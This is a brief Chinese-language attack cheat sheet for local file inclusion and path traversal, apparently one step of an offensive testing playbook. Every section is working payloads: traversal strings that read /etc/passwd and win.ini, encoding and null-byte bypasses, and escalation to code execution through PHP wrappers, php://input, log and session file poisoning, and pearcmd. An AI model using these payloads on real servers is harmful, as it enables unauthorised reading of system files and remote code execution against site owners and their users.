# LFI/路径穿越秒杀卡 (≤50行)

## 参数
```
file/path/template/dir/include/download/export + ../../..
```

## 一击
```
../../../../etc/passwd          (Linux)
..\..\..\..\windows\win.ini    (Windows)
双重编码: %252e%252e%252f%252e%252e
php<5.3: /etc/passwd%00
```

## 包含 → RCE（文件内容可控）
```
php://filter/convert.base64-encode/resource=index.php   # 读源码
php://input + POST body = <?php phpinfo();?>            # 伪协议执行
日志包含: UA 写 <?php ...?> → include /var/log/apache/access.log
session 包含: /tmp/sess_<id>
pearcmd: ?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?php...?>
```

→ 返回 S2: {可读?, 伪协议可用?, 可包含执行?}
